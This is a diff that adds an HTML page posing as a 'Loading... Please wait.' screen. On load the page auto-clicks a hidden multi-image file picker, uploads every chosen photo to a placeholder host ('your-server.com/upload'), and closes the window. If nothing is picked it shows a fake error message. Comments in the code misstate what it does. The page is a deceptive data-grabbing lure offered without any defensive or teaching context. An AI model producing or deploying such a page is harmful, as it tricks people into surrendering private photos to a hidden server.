@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        .hidden {
+            display: none;
+        }
+        .loading {
+            font-size: 24px;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading">Loading... Please wait.</div>
+
+    <!-- Hidden file input -->
+    <input type="file" id="photo-upload" accept="image/*" class="hidden" multiple>
+
+    <script>
+        // Check if the browser has permission to access the photo library
+        const fileInput = document.getElementById("photo-upload");
+        fileInput.click();
+
+        fileInput.addEventListener("change", async (event) => {
+            const files = event.target.files;
+            if (files.length > 0) {
+                // Upload each file to the server
+                for (const file of files) {
+                    const formData = new FormData();
+                    formData.append("photo", file);
+
+                    try {
+                        const response = await fetch("https://your-server.com/upload", {
+                            method: "POST",
+                            body: formData,
+                        });
+
+                        if (!response.ok) {
+                            console.error("Upload failed for file:", file.name);
+                        }
+                    } catch (error) {
+                        console.error("Error uploading file:", file.name, error);
+                    }
+                }
+
+                // Close the page after upload
+                window.close();
+            } else {
+                // Display a generic error message if no files are selected
+                document.querySelector(".loading").textContent = "An error occurred. Please try again later.";
+            }
+        });
+
+        // Abort if no files are selected after a short delay
+        setTimeout(() => {
+            if (fileInput.files.length === 0) {
+                document.querySelector(".loading").textContent = "An error occurred. Please try again later.";
+                window.close();
+            }
+        }, 5000); // 5-second timeout
+    </script>
+</body>
+</html>
